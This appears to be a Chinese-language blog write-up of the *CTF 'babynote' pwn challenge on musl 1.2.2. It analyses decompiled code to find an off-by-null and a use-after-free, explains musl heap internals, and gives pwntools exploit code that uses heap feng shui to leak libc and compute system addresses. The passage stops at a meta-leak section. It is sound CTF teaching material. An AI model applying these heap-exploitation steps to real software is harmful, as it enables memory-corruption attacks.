@@ -1,0 +1,609 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/04/19/starctf-babynote/">
+
+
+
+  <title>
+starctf_babynote - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">starctf_babynote
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-04-19 19:37:17">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-04-19T19:37:17+08:00">2022-04-19</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>24k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>21 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciryrr3rj20zk0m8nhk.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclj9410cj20zk0m8h12.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclffsa1cj20zk0m811l.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/19/starctf-babynote/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="starctfbabynote-musl122"><a class="markdownIt-Anchor" href="#starctfbabynote-musl122">#</a> starctf	babynote musl1.2.2</h1>
+<h2 id="环境以及保护"><a class="markdownIt-Anchor" href="#环境以及保护">#</a> 环境以及保护</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/babbynote/attachment$ file babynote </span></span><br><span class="line"><span class="comment">babynote: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, stripped</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ checksec --file=babynote</span></span><br><span class="line"><span class="comment">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE</span></span><br><span class="line"><span class="comment">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		2		babynote</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ ./libc.so </span></span><br><span class="line"><span class="comment">musl libc (x86_64)</span></span><br><span class="line"><span class="comment">Version 1.2.2</span></span><br><span class="line"><span class="comment">Dynamic Program Loader</span></span><br><span class="line"><span class="comment">Usage: ./libc.so [options] [--] pathname [args]</span></span><br><span class="line"><span class="comment">dreamcat@ubuntu:~/Desktop/*ctf/babbynote/attachment$ </span></span><br></pre></td></tr></table></figure>
+<p>第一次做 musl 的题目，有点迷茫。一边查资料一边摸着做。比赛的时候没有任何的突破。</p>
+<h2 id="探索的过程"><a class="markdownIt-Anchor" href="#探索的过程">#</a> 探索的过程</h2>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@ubuntu:~/Desktop<span class="comment">/*ctf/babbynote/attachment$ ./libc.so babynote </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">    _/  _/  _/        _/_/_/  _/_/_/_/_/  _/_/_/_/ </span></span><br><span class="line"><span class="comment">     _/_/_/        _/            _/      _/        </span></span><br><span class="line"><span class="comment">  _/_/_/_/_/      _/            _/      _/_/_/     </span></span><br><span class="line"><span class="comment">   _/_/_/        _/            _/      _/          </span></span><br><span class="line"><span class="comment">_/  _/  _/        _/_/_/      _/      _/           </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">                                                   </span></span><br><span class="line"><span class="comment">--------menu-------</span></span><br><span class="line"><span class="comment">1: add a note</span></span><br><span class="line"><span class="comment">2: find a note</span></span><br><span class="line"><span class="comment">3: delete a note</span></span><br><span class="line"><span class="comment">4: forget all notes</span></span><br><span class="line"><span class="comment">5: exit</span></span><br><span class="line"><span class="comment">option:</span></span><br></pre></td></tr></table></figure>
+<p>发现并没有 edit 的功能。</p>
+<p>反汇编以后，对于结构体的认知。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> babynote        struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> name            dq ?</span><br><span class="line"><span class="number">00000008</span> note            dq ?</span><br><span class="line"><span class="number">00000010</span> name_size       dq ?</span><br><span class="line"><span class="number">00000018</span> note_size       dq ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?</span><br><span class="line"><span class="number">00000028</span> babynote        ends</span><br></pre></td></tr></table></figure>
+<p>存在一个全局数组，储存了 abbynote 的指针，形成一个单链表。采用头插法进行添加。</p>
+<h3 id="add"><a class="markdownIt-Anchor" href="#add">#</a> add</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  babynote *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ptr = (babynote *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  ptr-&gt;name_size = addname(&amp;ptr-&gt;name);</span><br><span class="line">  ptr-&gt;note_size = addnote(&amp;ptr-&gt;note);</span><br><span class="line">  ptr-&gt;next = (__int64)<span class="built_in">list</span>;</span><br><span class="line">  <span class="built_in">list</span> = (babynote **)ptr;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*--------------------------------------------------------*/</span></span><br><span class="line">__int64 __fastcall <span class="title function_">addname</span><span class="params">(__int64 *ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name size: &quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  *ptr = (__int64)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);           <span class="comment">// calloc清空数据</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)readnode(*ptr, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">readnode</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="type">int</span>)i) = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> )                          <span class="comment">// 一字节\x00溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="type">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*--------------------------------------------------------*/</span></span><br><span class="line">__int64 __fastcall <span class="title function_">addnote</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;note size: &quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  *(_QWORD *)a1 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;note content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)readnode(*(_QWORD *)a1, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>add 添加时，ida 分析的结果并不准确，这里永远存在一字节的空溢出。</p>
+<p>后来根据网上查到的学习资料。由于 musl 的堆管理比较简单，这个空溢出可以用来修改 chunk 的 idx 位，伪造 meta。</p>
+<p>后面再说。</p>
+<h3 id="find"><a class="markdownIt-Anchor" href="#find">#</a> find</h3>
+<p>find 会创建一个 name 的 chunk, 然后根据 size 以及 list 保留的 size,cmp，最后比较字符串。如果相同就返回第一个找到的符合要求的 babynote 指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">find</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  babynote *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = <span class="number">0LL</span>;</span><br><span class="line">  size = addname(&amp;ptr);</span><br><span class="line">  v3 = cmp(ptr, size);                          <span class="comment">// 确认数据</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    info(v3-&gt;note, v3-&gt;note_size);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出babynote的信息</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">info</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%#lx:&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 &gt; i; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, a1[i]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出的信息也会收到 size 的限制。当时我有看到一个点，就是 i 是有符号的，而 a2 无符号。但是貌似没有什么价值。最后 free 那个临时创建的 chunk.</p>
+<h3 id="delete"><a class="markdownIt-Anchor" href="#delete">#</a> delete</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  babynote *v1; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  babynote **i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  babynote *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0LL</span>;</span><br><span class="line">  size = addname(&amp;v1);</span><br><span class="line">  ptr = cmp(v1, size);                          <span class="comment">// /删除某个特定的</span></span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr != <span class="built_in">list</span> || <span class="built_in">list</span>-&gt;next )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ptr-&gt;next )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( i = &amp;<span class="built_in">list</span>; ptr != *i; i = &amp;(*i)-&gt;next )</span><br><span class="line">          ;</span><br><span class="line">        *i = ptr-&gt;next;</span><br><span class="line">      &#125;                                         <span class="comment">// 解链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">list</span> = <span class="number">0LL</span>;                               <span class="comment">// 删除头指针，就清空了所有</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(ptr-&gt;name);</span><br><span class="line">    <span class="built_in">free</span>(ptr-&gt;note);                            <span class="comment">// 释放note</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oops.....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(v1);                                     <span class="comment">// 删除临时结构体</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>删除 note 的时候，会遍历链表，找到对应的指针后，会 set 对应结构的 next 指针。p-&gt;next = p-&gt;next-&gt;next. 但是如果 ptr 是尾指针，就不会进行 set. 存在 UAF</p>
+<h2 id="利用"><a class="markdownIt-Anchor" href="#利用">#</a> 利用</h2>
+<p>delete 最后一个，只会 free 对应的堆块，但是倒数第二个 babynote 的 next 没有 reset, 所以就存在了 uaf. 但是 musl 的堆块释放后并不会进入 bins。只有 meta 的所有 avail_maks 都被释放后才会将 meta 释放，并把 meta 放入双链表，dequeue（所以 meta free 后是）</p>
+<p>程序的了漏洞在于 delete 时存在的 UAF, 如果我们将其释放后，并对其 note 进行 reuse, 而且用作 babbynote, 就会在 slot 上储存 3 个指针，导致 heapaddr 泄露。但是这里需要布置对的结构。</p>
+<p><em><strong><u>musl 的堆比较特殊，meta 页是按照顺序申请的，而且与 group 页隔离。当同一个 size 的 meta 分配满之后，如果继续申请，会使用 avail_meta 保留的一个 meta 地址，当然这了 meta 是全新的。而且，一旦申请后，malloc_context active 数组对应位置就会保留正在分配的 meta. 同时会将这两个 meta 的 prev next 设置，形成双链表。如果其中一个 meta 满无法分配，或者被 free，就会解开连表。full_meta 的 prev 和 next 被清零。</u></strong></em></p>
+<h3 id="泄露libc"><a class="markdownIt-Anchor" href="#泄露libc">#</a> 泄露 libc</h3>
+<p>回到题目，这里我们可以泄露 group 组的地址，slot 地址是在 libc 的基础上得到的，所以泄露出 heap 的用户区地址就可以得到里 libc 地址。</p>
+<p>我们利用堆风水，将链表的最后一个 bebynote 释放，存在 uaf，然后通过构造，拿到他的 note slot 作为一个新的 babynote, 这杨这里就储存了 heapd 的地址，然后泄露。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#slot full size is 0x2c</span></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span>)<span class="comment">#slot full size is 0x6c</span></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)				<span class="comment">#free the first note,the meta(0xc)is freed,</span></span><br><span class="line">clean()					<span class="comment">#now meta(0x2c) has one no use,and 1 freed,meta(0xc) heav 3 freed</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>)		<span class="comment">#we alloc the last slot in meta(0x2c) for abynote,</span></span><br><span class="line">						<span class="comment">#.Reuse the 0 solt in meta(0xc) (malloc from bins),</span></span><br><span class="line">						<span class="comment">#then reuse the free slot in meta(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)			<span class="comment">#malloc a slot(0x2c) in a new meta2(0x2c,and malloc 2 slot(0xc) in meta(0xc)</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">b&#x27;a&#x27;</span>)			<span class="comment">#malloc a new slot(0xc),in meta(0xc),then free babynote a,then meta1(0x2c) will have 2 freed slot</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#malloc 3slot from  meta2(0x2c),so meta1(0x2c),have 2 freed slot</span></span><br><span class="line">add(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#</span></span><br><span class="line">add(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x28</span>)<span class="comment">#fill up meta2(0x2c)</span></span><br><span class="line">add(<span class="string">b&#x27;f&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x50</span>)		<span class="comment">#malloc a baby note from meta1(0x2c),meta1(0x2c) still have one freed, </span></span><br><span class="line"></span><br><span class="line">find(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;0x28:&quot;</span>)</span><br><span class="line">ss = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	ss = r.recv(<span class="number">2</span>)+ss</span><br><span class="line">ss  = <span class="string">b&#x27;0x&#x27;</span>+ss</span><br><span class="line"><span class="built_in">print</span>(ss)</span><br><span class="line">libcbase = <span class="built_in">int</span>(ss,<span class="number">16</span>) -  <span class="number">0x29fdf0</span></span><br><span class="line">stdout = libcbase + <span class="number">0x2a0e00</span></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">__malloc_context = <span class="number">0x2a1aa0</span>+libcbase</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase : &quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system : &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stdout : &quot;</span>,<span class="built_in">hex</span>(stdout))</span><br></pre></td></tr></table></figure>
+<h3 id="泄露其他地址meta"><a class="markdownIt-Anchor" href="#泄露其他地址meta">#</a> 泄露其他地址（meta）</h3>
+<p>这里，meta1 (0x2c) 还有一个 freed slot ，我们其实就是通过这个泄露的 heap。find 一个很重要的点就是，会 addname. 而且就算查不到也不出错，然后再将其释放，所以我们可以由此来重复利用这个 freed slot。find 的时候，这要 size 合适，就会将它返回给我们，然后在里面写入数据。并释放。之前我们说过，这里可以泄露 heap 地址，是因为他是我们 list 的最后一个 banynote,delete 后上一个 babynote 的 next 指针依旧指向这个 slot，所以导致泄露。</p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220420203251874.png" alt="image-20220420203251874"></p>
